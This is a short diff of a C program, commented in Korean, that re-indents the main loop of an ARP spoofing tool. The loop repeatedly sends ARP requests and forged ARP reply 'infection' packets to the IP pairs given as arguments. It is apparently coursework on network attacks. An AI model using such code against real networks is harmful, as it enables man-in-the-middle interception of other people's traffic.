@@ -34,23 +34,23 @@ int main(int argc, char* argv[]) {
     // 3. 반복문으로 모든 IP 쌍에 대해 공격 수행
     while(true) {
         for (int i = 2; i < argc; i += 2) {
-        const char* si = argv[i];
-        const char* ti = argv[i+1];
-        
-        uint32_t sender_ip = setIp(si);
-        uint32_t target_ip = setIp(ti);
-        // 각 IP 쌍에 대해 ARP 공격 함수 호출
-        // 1. Sender IP의 MAC 주소를 얻기 위해 ARP Request를 보냄
-        request_sender_mac(pcap, my_mac, my_ip, sender_ip);
-        // 2. 응답으로 Target의 MAC 주소를 알아냄
-        uint8_t sender_mac[6];
-        if (!analysis_sender_mac(pcap, sender_ip, target_ip, sender_mac)) {
-            printf("Failed to get sender's MAC address.\n");
-            continue;
-        }
-        // 3. 위조된 ARP Reply (Infection) 패킷을 Target에게 전송
+            const char* si = argv[i];
+            const char* ti = argv[i+1];
+            
+            uint32_t sender_ip = setIp(si);
+            uint32_t target_ip = setIp(ti);
+            // 각 IP 쌍에 대해 ARP 공격 함수 호출
+            // 1. Sender IP의 MAC 주소를 얻기 위해 ARP Request를 보냄
+            request_sender_mac(pcap, my_mac, my_ip, sender_ip);
+            // 2. 응답으로 Target의 MAC 주소를 알아냄
+            uint8_t sender_mac[6];
+            if (!analysis_sender_mac(pcap, sender_ip, target_ip, sender_mac)) {
+                printf("Failed to get sender's MAC address.\n");
+                continue;
+            }
+            // 3. 위조된 ARP Reply (Infection) 패킷을 Target에게 전송
 
-        send_arp_attack(pcap, sender_mac, sender_ip, target_ip, my_mac);
+            send_arp_attack(pcap, sender_mac, sender_ip, target_ip, my_mac);
         }
     }
     
